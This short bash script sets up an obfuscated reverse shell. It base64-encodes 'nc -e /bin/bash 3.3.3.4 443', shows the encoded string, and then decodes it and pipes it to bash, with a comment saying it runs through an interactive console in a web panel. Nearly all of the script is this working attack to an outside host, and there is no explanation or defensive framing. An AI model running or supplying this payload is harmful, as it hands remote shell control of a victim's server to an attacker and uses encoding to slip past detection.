#!/bin/bash

echo -e "nc -e /bin/bash 3.3.3.4 443" | base64 
#  bmMgLWUgL2Jpbi9iYXNoIDMuMy4zLjQgNDQzCg==

##Trougth a interactive console in web panel
echo -n "bmMgLWUgL2Jpbi9iYXNoIDMuMy4zLjQgNDQzCg==" | base64 -d | bash